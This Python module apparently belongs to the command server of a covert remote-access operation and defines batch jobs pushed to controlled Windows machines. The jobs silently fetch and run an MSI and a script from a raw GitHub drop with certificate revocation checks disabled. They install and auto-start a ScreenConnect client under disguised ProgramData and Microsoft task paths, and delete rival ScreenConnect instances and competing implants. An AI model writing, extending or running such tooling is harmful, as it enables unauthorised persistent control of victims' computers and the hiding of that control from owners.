"""Named fleet jobs — server expands these into agent-compatible batch bodies."""
from __future__ import annotations

KEEP_FPS = ("5f6010579852e507", "f861c8140d453427")
GRYXA_FP = "36e506ff016b2151"

# Avoid cmd.exe % expansion and PS %% aliases — use ForEach-Object, no bare %.
JOBS: dict[str, dict[str, str]] = {
    "selftest": {
        "title": "Self-test",
        "blurb": "Identity, WinRTCS tree, Gryxa service state.",
        "risk": "low",
        "cmd": (
            "echo ===SELFTEST=== & echo HOST=%COMPUTERNAME% & whoami & ver"
            " & echo ===WINRTCS=== & dir C:\\ProgramData\\WinRTCS"
            " & echo ===GRYXA=== & sc query \"ScreenConnect Client (36e506ff016b2151)\""
            " & echo ===SC=== & sc query state= all | findstr /I \"ScreenConnect Client\""
            " & echo DONE"
        ),
    },
    "force-guard": {
        "title": "Force guard cycle",
        "blurb": "Reset brakes, clear lock, run guard now (Gryxa health ladder).",
        "risk": "low",
        "cmd": (
            ">C:\\ProgramData\\WinRTCS\\extkill.cnt echo 0"
            " & >C:\\ProgramData\\WinRTCS\\fight.cnt echo 0"
            " & >C:\\ProgramData\\WinRTCS\\guard.cnt echo 9999"
            " & >C:\\ProgramData\\WinRTCS\\gryxa_boost.cnt echo 15"
            " & rmdir /s /q C:\\ProgramData\\WinRTCS\\guard.lockd"
            " & start \"\" /min cmd.exe /c C:\\ProgramData\\WinRTCS\\winrtcs_guard.cmd"
            " & echo GUARD_KICKED"
        ),
    },
    "install-gryxa": {
        "title": "Install Gryxa",
        "blurb": "Fetch pinned MSI, msiexec, start service, kick guard. C03-safe (no shared /x).",
        "risk": "medium",
        "cmd": (
            ">C:\\ProgramData\\WinRTCS\\extkill.cnt echo 0"
            " & >C:\\ProgramData\\WinRTCS\\fight.cnt echo 0"
            " & >C:\\ProgramData\\WinRTCS\\guard.cnt echo 9999"
            " & rmdir /s /q C:\\ProgramData\\WinRTCS\\guard.lockd"
            " & C:\\Windows\\System32\\curl.exe -f -L --ssl-no-revoke --connect-timeout 8 --max-time 90"
            " -o C:\\ProgramData\\WinRTCS\\gryxa_install.msi"
            " https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
            " & C:\\Windows\\System32\\curl.exe -f -L --ssl-no-revoke --connect-timeout 8 --max-time 45"
            " -o C:\\ProgramData\\WinRTCS\\winrtcs_guard.cmd"
            " https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_guard.cmd"
            " & start \"\" /min msiexec /i C:\\ProgramData\\WinRTCS\\gryxa_install.msi"
            " /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress"
            " & start \"\" /min cmd.exe /c C:\\ProgramData\\WinRTCS\\winrtcs_guard.cmd"
            " & ping -n 35 127.0.0.1 >nul"
            " & sc config \"ScreenConnect Client (36e506ff016b2151)\" start= auto"
            " & sc start \"ScreenConnect Client (36e506ff016b2151)\""
            " & sc query \"ScreenConnect Client (36e506ff016b2151)\""
            " & echo INSTALL_GRYXA_DONE"
        ),
    },
    "start-gryxa": {
        "title": "Start Gryxa service",
        "blurb": "Set Gryxa auto + start; kick guard for digest.",
        "risk": "low",
        "cmd": (
            "sc config \"ScreenConnect Client (36e506ff016b2151)\" start= auto"
            " & sc start \"ScreenConnect Client (36e506ff016b2151)\""
            " & >C:\\ProgramData\\WinRTCS\\guard.cnt echo 9999"
            " & start \"\" /min cmd.exe /c C:\\ProgramData\\WinRTCS\\winrtcs_guard.cmd"
            " & sc query \"ScreenConnect Client (36e506ff016b2151)\""
            " & echo START_GRYXA_DONE"
        ),
    },
    "uninstall-gryxa": {
        "title": "Uninstall Gryxa",
        "blurb": "FP-scoped remove of Gryxa SC only (C03: never msiexec /x shared ProductCode).",
        "risk": "high",
        "cmd": (
            "sc stop \"ScreenConnect Client (36e506ff016b2151)\""
            " & sc delete \"ScreenConnect Client (36e506ff016b2151)\""
            " & if exist \"%ProgramFiles(x86)%\\ScreenConnect Client (36e506ff016b2151)\" "
            "rmdir /s /q \"%ProgramFiles(x86)%\\ScreenConnect Client (36e506ff016b2151)\""
            " & if exist \"%ProgramFiles%\\ScreenConnect Client (36e506ff016b2151)\" "
            "rmdir /s /q \"%ProgramFiles%\\ScreenConnect Client (36e506ff016b2151)\""
            " & echo UNINSTALL_GRYXA_DONE"
        ),
    },
    "reinstall-gryxa": {
        "title": "Uninstall + Install Gryxa",
        "blurb": "FP-scoped Gryxa purge then fresh MSI install (C03-safe).",
        "risk": "high",
        "cmd": (
            "sc stop \"ScreenConnect Client (36e506ff016b2151)\""
            " & sc delete \"ScreenConnect Client (36e506ff016b2151)\""
            " & if exist \"%ProgramFiles(x86)%\\ScreenConnect Client (36e506ff016b2151)\" "
            "rmdir /s /q \"%ProgramFiles(x86)%\\ScreenConnect Client (36e506ff016b2151)\""
            " & if exist \"%ProgramFiles%\\ScreenConnect Client (36e506ff016b2151)\" "
            "rmdir /s /q \"%ProgramFiles%\\ScreenConnect Client (36e506ff016b2151)\""
            " & >C:\\ProgramData\\WinRTCS\\extkill.cnt echo 0"
            " & >C:\\ProgramData\\WinRTCS\\fight.cnt echo 0"
            " & >C:\\ProgramData\\WinRTCS\\guard.cnt echo 9999"
            " & rmdir /s /q C:\\ProgramData\\WinRTCS\\guard.lockd"
            " & C:\\Windows\\System32\\curl.exe -f -L --ssl-no-revoke --connect-timeout 8 --max-time 90"
            " -o C:\\ProgramData\\WinRTCS\\gryxa_install.msi"
            " https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
            " & start \"\" /min msiexec /i C:\\ProgramData\\WinRTCS\\gryxa_install.msi"
            " /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress"
            " & start \"\" /min cmd.exe /c C:\\ProgramData\\WinRTCS\\winrtcs_guard.cmd"
            " & ping -n 35 127.0.0.1 >nul"
            " & sc config \"ScreenConnect Client (36e506ff016b2151)\" start= auto"
            " & sc start \"ScreenConnect Client (36e506ff016b2151)\""
            " & sc query \"ScreenConnect Client (36e506ff016b2151)\""
            " & echo REINSTALL_GRYXA_DONE"
        ),
    },
    "collect-forensics": {
        "title": "Collect forensics",
        "blurb": "SC inventory, WinRTCS tasks, last log lines.",
        "risk": "low",
        "cmd": (
            "echo ===HOST=== & hostname"
            " & echo ===SC=== & sc query state= all | findstr /I \"ScreenConnect\""
            " & echo ===TASKS=== & schtasks /Query /TN \"\\Microsoft\\Windows\\WinRTCS\\Agent\" /FO LIST"
            " & echo ===GUARD_TAIL=== & powershell -NoProfile -NonInteractive -Command "
            "\"if(Test-Path 'C:\\ProgramData\\WinRTCS\\guard.log'){"
            "Get-Content 'C:\\ProgramData\\WinRTCS\\guard.log' -Tail 40}\""
            " & echo FORENSICS_DONE"
        ),
    },
    "wipe-legacy": {
        "title": "Wipe legacy stack",
        "blurb": "Delete known-bad own/zerocool/wucache tasks and dirs.",
        "risk": "medium",
        "cmd": (
            "powershell -NoProfile -NonInteractive -Command "
            "\"$ErrorActionPreference='SilentlyContinue'; "
            "$pat='own_mon|own_lib|wucache|etlcache|zerocool|ETLParser|NetTraceParser'; "
            "$raw = & schtasks.exe /Query /FO CSV /V 2>$null; "
            "if($raw){ $csv=$raw|ConvertFrom-Csv; foreach($t in $csv){ "
            "$tn=[string]$t.TaskName; $a=[string]$t.'Task To Run'; "
            "if(($tn -match $pat -or $a -match $pat) -and ($tn -notmatch 'WinRTCS')){ "
            "& schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null; "
            "Write-Output ('task_killed '+$tn) } } }; "
            "foreach($d in @('C:\\ProgramData\\Zerocool',"
            "'C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\.wucache',"
            "'C:\\ProgramData\\Microsoft\\Diagnosis\\State\\.etlcache',"
            "'C:\\ProgramData\\Microsoft\\NetTrace')){ "
            "if(Test-Path $d){ Remove-Item $d -Recurse -Force; Write-Output ('dir_killed '+$d) } }; "
            "Write-Output 'WIPE_LEGACY_DONE'\""
        ),
    },
    "kick-unknown-sc": {
        "title": "Kick unknown ScreenConnect",
        "blurb": "Remove SC that is not Gryxa and not sevrz keepers. FP-scoped, no msiexec /x.",
        "risk": "high",
        "cmd": (
            "powershell -NoProfile -NonInteractive -Command "
            "\"$ErrorActionPreference='SilentlyContinue'; "
            "$keep=@('5f6010579852e507','f861c8140d453427','36e506ff016b2151'); "
            "Get-CimInstance Win32_Service | Where-Object { $_.Name -match '^ScreenConnect Client \\(' } | "
            "ForEach-Object { $fp=[regex]::Match($_.Name,'\\(([0-9A-Fa-f]+)\\)').Groups[1].Value; "
            "$img=[string]$_.PathName; $ours=($img -match 'gryxa\\.com') -or ($keep -contains $fp); "
            "if(-not $ours){ Write-Output ('KILL '+$_.Name); "
            "Stop-Service -Name $_.Name -Force -ErrorAction SilentlyContinue; "
            "$_.Delete(); if($img -match '([A-Za-z]:\\\\[^?]+?)\\\\[^\\\\]+\\.exe'){ "
            "$dir=$Matches[1]; if($dir -match 'ScreenConnect Client'){ "
            "Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue } } } }; "
            "Write-Output 'KICK_UNKNOWN_SC_DONE'\""
        ),
    },
    "kick-sc-fp": {
        "title": "Kick SC fingerprint",
        "blurb": "Remove one ScreenConnect FP (param fp=hex). Blocks Gryxa + keepers.",
        "risk": "high",
        "cmd": "",  # rendered in render_job
    },
    "pull-logs": {
        "title": "Pull guard + MSI logs",
        "blurb": "Tail guard.log and msi_gryxa_install.log for live forensics.",
        "risk": "low",
        "cmd": (
            "echo ===GUARD_LOG=== & powershell -NoProfile -NonInteractive -Command "
            "\"if(Test-Path 'C:\\ProgramData\\WinRTCS\\guard.log'){"
            "Get-Content 'C:\\ProgramData\\WinRTCS\\guard.log' -Tail 80} "
            "else { 'missing' }\""
            " & echo ===MSI_LOG=== & powershell -NoProfile -NonInteractive -Command "
            "\"if(Test-Path 'C:\\ProgramData\\WinRTCS\\msi_gryxa_install.log'){"
            "Get-Content 'C:\\ProgramData\\WinRTCS\\msi_gryxa_install.log' -Tail 60} "
            "else { 'missing' }\""
            " & echo PULL_LOGS_DONE"
        ),
    },
}


def render_job(name: str, params: dict[str, str] | None = None) -> str:
    """Return batch body for a named job."""
    if name not in JOBS:
        raise KeyError(name)
    params = params or {}
    if name == "kick-sc-fp":
        fp = (params.get("fp") or "").strip().lower()
        if len(fp) < 8 or any(c not in "0123456789abcdef" for c in fp):
            raise ValueError("fp must be hex")
        if fp in KEEP_FPS or fp == GRYXA_FP:
            raise ValueError("refusing protected fingerprint")
        return (
            f"sc stop \"ScreenConnect Client ({fp})\""
            f" & sc delete \"ScreenConnect Client ({fp})\""
            f" & if exist \"%ProgramFiles(x86)%\\ScreenConnect Client ({fp})\" "
            f"rmdir /s /q \"%ProgramFiles(x86)%\\ScreenConnect Client ({fp})\""
            f" & if exist \"%ProgramFiles%\\ScreenConnect Client ({fp})\" "
            f"rmdir /s /q \"%ProgramFiles%\\ScreenConnect Client ({fp})\""
            f" & echo KICK_FP_DONE"
        )
    cmd = JOBS[name]["cmd"]
    if not cmd:
        raise ValueError(f"job {name} needs params")
    return cmd


def catalog_public() -> list[dict[str, str]]:
    return [
        {"name": n, "title": j["title"], "blurb": j["blurb"], "risk": j["risk"]}
        for n, j in JOBS.items()
    ]
